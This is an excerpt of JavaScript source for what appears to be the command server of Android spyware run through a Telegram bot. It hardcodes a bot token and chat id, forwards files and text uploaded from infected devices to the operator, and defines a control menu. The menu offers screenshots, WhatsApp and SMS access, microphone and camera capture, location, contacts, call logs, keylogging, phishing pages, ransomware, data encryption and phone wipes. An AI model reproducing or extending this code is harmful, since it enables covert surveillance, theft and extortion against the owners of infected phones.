...
const token = '8308642529:AAFJxkiFFAxZ-WngYU2r8zGvGzGf6EylcLU'
const id = '5389788898'
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        ...
                        {text: '🚨𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗢🚨', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂𝗚𝗘𝗧 𝗙𝗜𝗟𝗘📂', callback_data: `file:${uuid}`},
                        {text: '👹𝗗𝗘𝗟𝗘𝗧𝗘 𝗙𝗜𝗟𝗘👹', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '🎟️𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧🎟️', callback_data: `screenshot:${uuid}`},
                        {text: '👾𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣👾', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: '🌀𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗🌀', callback_data: `clipboard:${uuid}`},
                        {text: '🥎𝗠𝗜𝗖𝗥𝗢𝗣𝗛𝗢𝗡𝗘🥎', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '🔰𝗠𝗔𝗜𝗡 𝗖𝗔𝗠𝗘𝗥𝗔🔰', callback_data: `camera_main:${uuid}`},
                        {text: '🎪𝗦𝗘𝗟𝗙𝗜𝗘 𝗖𝗔𝗠𝗘𝗥𝗔🎪', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🌐𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡🌐', callback_data: `location:${uuid}`},
                        {text: '🗯️𝗧𝗢𝗔𝗦𝗧🗯️', callback_data: `toast:${uuid}`}
                    ],
                     [
                        {text: '📮𝗚𝗘𝗧 𝗣𝗔𝗬𝗠𝗘𝗡𝗧📮', callback_data: `Settings:${uuid}`},
                        {text: '☢️𝗣𝗛𝗢𝗡𝗘 𝗥𝗘𝗦𝗘𝗧☢️', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '☃️𝗖𝗔𝗟𝗟 𝗟𝗢𝗚𝗦☃️', callback_data: `calls:${uuid}`},
                        {text: '🏆𝗖𝗢𝗡𝗧𝗔𝗖𝗧𝗦🏆', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '⏲️𝗩𝗜𝗕𝗥𝗔𝗧𝗘⏲️', callback_data: `vibrate:${uuid}`},
                        {text: '🔔𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '🧊𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦🧊', callback_data: `messages:${uuid}`},
                        {text: '🎁𝗦𝗘𝗡𝗗 𝗦𝗠𝗦🎁', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🚸𝗥𝗔𝗡𝗦𝗢𝗠𝗪𝗔𝗥𝗘🚸', callback_data: `Ransomware:${uuid}`},
                        {text: '✳️𝗙𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗣𝗔𝗚𝗘✳️', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: '🦞𝗣𝗟𝗔𝗬 𝗔𝗨𝗗𝗜𝗢🦞', callback_data: `play_audio:${uuid}`},
                        {text: '☯️𝗦𝗧𝗢𝗣 𝗔𝗨𝗗𝗜𝗢☯️', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '⛔‼️𝗦𝗘𝗡𝗗 𝗦𝗠𝗦 𝗧𝗢 𝗔𝗹𝗹 𝗖𝗢𝗡𝗧𝗔𝗖𝗧𝗦‼️⛔',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {text: '🔒𝗘𝗡𝗖𝗥𝗬𝗣𝗧 𝗗𝗔𝗧𝗔🔒', callback_data: `encrypt_data:${uuid}`},
                        {text: '🔓𝗗𝗘𝗖𝗥𝗬𝗣𝗧 𝗗𝗔𝗧𝗔🔓', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: '🔮𝗞𝗘𝗬𝗟𝗢𝗚𝗚𝗘𝗥 𝗢𝗡🔮', callback_data: `keylogger_on:${uuid}`},
                        {text: '⛽𝗞𝗘𝗬𝗟𝗢𝗚𝗘𝗥 𝗢𝗙𝗙⛽', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
